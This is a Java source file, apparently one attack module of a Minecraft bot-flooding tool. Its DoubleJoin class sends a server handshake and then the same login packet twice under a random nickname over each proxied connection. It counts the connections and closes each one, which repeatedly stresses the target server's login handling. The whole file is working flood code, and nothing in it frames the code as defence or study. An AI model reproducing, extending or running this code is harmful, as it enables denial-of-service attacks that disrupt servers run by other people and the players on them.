package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.util.Random;

import ml.dima_dencep.bettermcbot.Main;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;
import ml.dima_dencep.bettermcbot.minecraftutils.Handshake;
import ml.dima_dencep.bettermcbot.minecraftutils.LoginRequest;

public class DoubleJoin implements Method {
   private Handshake handshake;
   private byte[] bytes;

   private String randomString(int len) {
      int leftLimit = 97;
      int rightLimit = 122;
      int targetStringLength = len;
      Random random = new Random();
      StringBuilder buffer = new StringBuilder(len);

      for(int i = 0; i < targetStringLength; ++i) {
         int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (float)(rightLimit - leftLimit + 1));
         buffer.append((char)randomLimitedInt);
      }

      return buffer.toString();
   }

   public DoubleJoin() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
      String nick = this.randomString(14);
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(nick)).getWrappedPacket()));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(nick)).getWrappedPacket()));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
